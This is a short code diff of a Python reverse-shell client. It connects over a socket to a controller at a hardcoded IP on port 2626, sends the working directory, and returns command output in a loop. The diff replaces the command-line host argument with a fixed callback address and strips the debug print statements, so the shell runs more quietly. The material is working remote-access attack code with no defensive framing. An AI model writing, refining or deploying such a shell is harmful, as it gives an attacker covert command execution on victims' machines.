@@ -3,12 +3,13 @@ import os
 import subprocess
 import sys
 
-# Server to call to
-server_host = sys.argv[1]
+#... please don't call me back
+my_ip="10.110.156.67"
 
+# Server to call to
+server_host = my_ip
 # Server port
 server_port = 2626
-
 # text buffer size (128KiB)
 recv_buffer = 1024 * 128
 
@@ -21,7 +22,6 @@ soc.connect((server_host, server_port))
 
 # Get current directory
 cwd = os.getcwd()
-print("cwd is "+cwd)
 soc.send(cwd.encode())
 
 # Main loop
@@ -52,8 +52,6 @@ while True:
     # get current dir
     cwd = os.getcwd()
     
-    print("output: "+output)
-
     #send result to server
     message = f"{output}{seperator}{cwd}"
     soc.send(message.encode())
